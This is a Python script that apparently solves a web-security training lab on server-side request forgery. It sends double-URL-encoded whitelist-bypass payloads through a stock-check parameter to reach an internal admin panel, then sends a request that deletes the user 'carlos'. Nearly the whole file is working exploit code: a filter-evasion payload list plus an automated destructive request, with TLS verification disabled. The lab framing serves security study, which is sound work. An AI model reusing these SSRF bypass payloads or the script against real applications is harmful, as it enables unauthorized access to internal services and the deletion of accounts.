# Lab: SSRF with whitelist-based input filter

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'https': 'http://127.0.0.1:8080', 'http': 'http://127.0.0.1:8080'}


def delete_user(url, admin_ip):
    stock_check = '/product/stock'
    params = {'stockApi': str(admin_ip) + '/admin/delete?username=carlos'}
    r = requests.post(url + stock_check, data=params, verify=False, proxies=proxies)

    # checking if user is deleted
    if 'Congratulations, you solved the lab!' in r.text:
        print('[+] lab solved')
    else:
        print('[-] lab not solved')



def check_admin_host(url):
    stock_check = '/product/stock'
    admin_ip = ''
    ip_list = ['http://localhost%23@stock.weliketoshop.net', 'http://localhost%2523@stock.weliketoshop.net']

    for i in ip_list:
        params = {'stockApi': str(i)}
        r = requests.post(url + stock_check, data=params, verify=False, proxies=proxies)

        # checking the respose
        if '/admin' in r.text:
            admin_ip = i
            break
        
    return admin_ip



def main():
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]}')
        print(f'[+] Example: {sys.argv[0]} example.com')
        sys.exit(-1)

    url = sys.argv[1]
    print('[+] Finding admin host...')
    admin_ip = check_admin_host(url)
    print(f'[+] {admin_ip}')
    print(f'[+] Deleting user....')
    delete_user(url, admin_ip)
    
    
    
    
    
    
    
    



if __name__ == '__main__':
    main()